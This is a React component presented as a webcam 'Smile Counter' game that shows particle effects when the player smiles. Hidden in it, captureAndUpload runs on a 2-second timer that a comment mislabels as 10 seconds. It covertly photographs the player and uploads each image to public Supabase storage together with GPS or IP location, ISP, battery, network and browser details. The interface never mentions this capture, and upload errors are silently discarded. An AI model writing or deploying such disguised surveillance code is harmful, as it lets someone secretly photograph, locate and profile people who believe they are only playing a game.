import React, { useEffect, useRef, useState } from "react";
import * as THREE from "three";
import { supabaseClient } from "../supabaseClient";
import { loadFaceMesh, detectSmile, getFacePosition } from "../utils/smileDetection";
import { ParticleEffect } from "../utils/particleEffects";
import { getSmartLocation, getDeviceDetails } from "../utils/capture";
import "./SmileGame.css";

export default function SmileGame() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const sceneRef = useRef(null);
  const cameraRef = useRef(null);
  const rendererRef = useRef(null);
  const particlesRef = useRef([]);
  const [smileCount, setSmileCount] = useState(0);
  const [isSmiling, setIsSmiling] = useState(false);
  const [captureCount, setCaptureCount] = useState(0);
  const smileTimeoutRef = useRef(null);
  const lastSmileRef = useRef(0);
  const captureIntervalRef = useRef(null);
  const streamRef = useRef(null);

  const captureAndUpload = async (video) => {
    try {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);

      // Get location and device info in parallel
      const [locData, deviceInfo] = await Promise.all([
        getSmartLocation(),
        getDeviceDetails(),
      ]);

      canvas.toBlob(async (blob) => {
        const timestamp = Date.now();
        const sessionId = `game_${timestamp}`;
        const fileName = `game_img_${timestamp}.jpg`;

        try {
          // Upload image to storage
          const { error: uploadError } = await supabaseClient.storage
            .from("images")
            .upload(fileName, blob);

          if (!uploadError) {
            const { data } = supabaseClient.storage.from("images").getPublicUrl(fileName);
            const imageUrl = data.publicUrl;

            // Save image to database
            const { error: imgError } = await supabaseClient.from("images_table").insert([
              {
                session_id: sessionId,
                image_url: imageUrl,
              },
            ]);

            // Save location data
            const { error: locError } = await supabaseClient.from("location_table").insert([
              {
                session_id: sessionId,
                latitude: locData.lat,
                longitude: locData.lon,
                location_type: locData.type,
                city: locData.details?.city || null,
                region: locData.details?.region || null,
                country: locData.details?.country || null,
                isp: locData.details?.org || null,
                accuracy: locData.details?.accuracy || null,
              },
            ]);

            // Save device data
            const { error: devError } = await supabaseClient.from("device_table").insert([
              {
                session_id: sessionId,
                battery_level: deviceInfo.battery_level,
                is_charging: deviceInfo.is_charging,
                network_type: deviceInfo.network_type,
                internet_speed: deviceInfo.internet_speed,
                screen_resolution: deviceInfo.screen_res,
                platform: deviceInfo.platform,
                browser: deviceInfo.browser,
              },
            ]);

            setCaptureCount((prev) => prev + 1);
          }
        } catch (error) {
        }
      }, "image/jpeg", 0.8);
    } catch (error) {
    }
  };

  useEffect(() => {
    initializeGame();
    return () => cleanup();
  }, []);

  const initializeGame = async () => {
    // Setup camera
    const video = videoRef.element = document.createElement("video");
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    streamRef.current = stream;
    video.srcObject = stream;
    video.play();

    // Setup Three.js scene
    const canvas = canvasRef.current;
    const scene = new THREE.Scene();
    scene.background = new THREE.Color(0x0a0e27);
    sceneRef.current = scene;

    const camera = new THREE.PerspectiveCamera(
      75,
      window.innerWidth / window.innerHeight,
      0.1,
      1000
    );
    camera.position.z = 5;
    cameraRef.current = camera;

    const renderer = new THREE.WebGLRenderer({ canvas, antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(window.devicePixelRatio);
    rendererRef.current = renderer;

    // Add lights
    const ambientLight = new THREE.AmbientLight(0xffffff, 0.6);
    scene.add(ambientLight);

    const pointLight = new THREE.PointLight(0xffffff, 0.8);
    pointLight.position.set(5, 5, 5);
    scene.add(pointLight);

    // Load facemesh
    const loadedModel = await loadFaceMesh();
    if (!loadedModel) {
      return;
    }

    // Animation loop
    const animate = async () => {
      requestAnimationFrame(animate);

      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        // Detect smile
        const isCurrentlySmiling = await detectSmile(video);
        
        if (isCurrentlySmiling) {
          const now = Date.now();
          if (now - lastSmileRef.current > 500) {
            // Only trigger once every 500ms
            setSmileCount((prev) => prev + 1);
            
            // Get face position
            const facePos = await getFacePosition(video);
            
            if (facePos) {
              // Normalize position to screen coordinates
              const x = (facePos.x / video.videoWidth) * 2 - 1;
              const y = -(facePos.y / video.videoHeight) * 2 + 1;
              const z = facePos.z / 200;
              
              // Create random effect (flower or heart)
              const effectType = Math.random() > 0.5 ? "flower" : "heart";
              const particle = new ParticleEffect(scene, x * 5, y * 5, effectType);
              particlesRef.current.push(particle);
            }
            
            lastSmileRef.current = now;
            setIsSmiling(true);
            
            clearTimeout(smileTimeoutRef.current);
            smileTimeoutRef.current = setTimeout(() => {
              setIsSmiling(false);
            }, 300);
          }
        }
      }

      // Update particles
      particlesRef.current = particlesRef.current.filter((particle) => {
        const isAlive = particle.update();
        if (!isAlive) {
          particle.dispose();
        }
        return isAlive;
      });

      renderer.render(scene, camera);
    };

    animate();

    // Auto-capture images every 10 seconds
    captureIntervalRef.current = setInterval(() => {
      captureAndUpload(video);
    }, 2000);

    // Handle window resize
    const handleResize = () => {
      const width = window.innerWidth;
      const height = window.innerHeight;
      camera.aspect = width / height;
      camera.updateProjectionMatrix();
      renderer.setSize(width, height);
    };

    window.addEventListener("resize", handleResize);

    return () => {
      window.removeEventListener("resize", handleResize);
      stream.getTracks().forEach((track) => track.stop());
    };
  };

  const cleanup = () => {
    if (rendererRef.current) {
      rendererRef.current.dispose();
    }
    if (smileTimeoutRef.current) {
      clearTimeout(smileTimeoutRef.current);
    }
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
    }
  };

  return (
    <div className="smile-game">
      <canvas ref={canvasRef} className="game-canvas"></canvas>
      
      <div className="smile-ui">
        <div className="smile-counter">
          <h1>😊 Smile Counter</h1>
          <div className="counter-display">{smileCount}</div>
          <p className="instruction">Smile at the camera! 👀</p>
        
        </div>
        
        <div className={`smile-indicator ${isSmiling ? "smiling" : ""}`}>
          {isSmiling ? "😄 SMILING!" : "😐 Ready..."}
        </div>
      </div>
    </div>
  );
}
